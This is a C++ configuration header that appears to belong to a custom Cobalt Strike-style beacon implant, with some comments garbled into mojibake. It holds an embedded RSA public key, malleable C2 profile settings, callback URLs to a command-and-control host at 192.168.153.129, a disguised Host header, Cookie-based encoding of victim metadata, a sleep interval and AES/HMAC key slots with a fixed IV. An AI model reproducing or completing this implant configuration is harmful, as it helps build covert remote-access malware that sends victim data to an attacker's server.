#pragma once
#include <string>

namespace Config {
	//��������Կ
	#define			PUBKEY  "-----BEGIN PUBLIC KEY-----\n"\
		"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0u\n"\
		"TpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7em\n"\
		"VRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQAB\n"\
		"-----END PUBLIC KEY-----"

	/*POST�ذ�����
		http-post {
		set uri "/RCg/vp6rBcQ.htm";
		client {
			output {
				netbios;
				prepend "hmr2In1XD14=";
				header "Cookie";
			}
			id {
				base64url;
				parameter "icar";
			}
		}
	*/
	#define PostId  L"icar"
	#define	PostUrl  L"http://192.168.153.129/RCg/neak.htm"     //profile���õ�post uri
	std::string	IdCipher = "base64";                          //û����""
	std::string	UsePostCookie = "1";                             //��ʹ��cookie��""
	std::string	PostPrepend = "hmr2In1XD14=";                    //"hmr2In1XD14="
	
	/*--GET��������
	http-get {
		set uri "/5aq/XP/SY75Qyw.htm";
		client {
		header "Host" "fukuoka.cloud-maste.com";
		header "Connection" "Keep-Alive";
		header "Cache-Control" "no-cache";
		metadata {
			netbios;
			prepend "CzFc6k28XGpZ=";
			header "Cookie";
		}
	}*/
#define GetUrl L"http://192.168.153.129/5aq/XP/neak.htm"//(plainHTTP+C2+"/5aq/XP/neak.htm") //profile ���õ�get uri
	std::string	GetPrepend = "CzFc6k28XGpZ=";                        //"CzFc6k28XGpZ="
		//profileû����������GetPrepend = ""
	std::string	MetaCipher = "netbios";
		//metadata {
		//	base64;
		//	header "Cookie";
		//}
	std::string Output_cipher = "netbios";
		//Output_cipher = "netbios" //����base64
		//server { client���ܷ�ʽ���ó�һ��
		//    output {
		//        netbios; #base64
		//        print;
		//    }
		//}

	#define	WAITTIME 1000*1;
	bool	VerifySSLCert = true;

	#define	 AES_IV  (BYTE*)"abcdefghijklmnop"
	unsigned char	GlobalKey[16];
	unsigned char	AesKey[32];
	unsigned char	HmacKey[32];
	
}
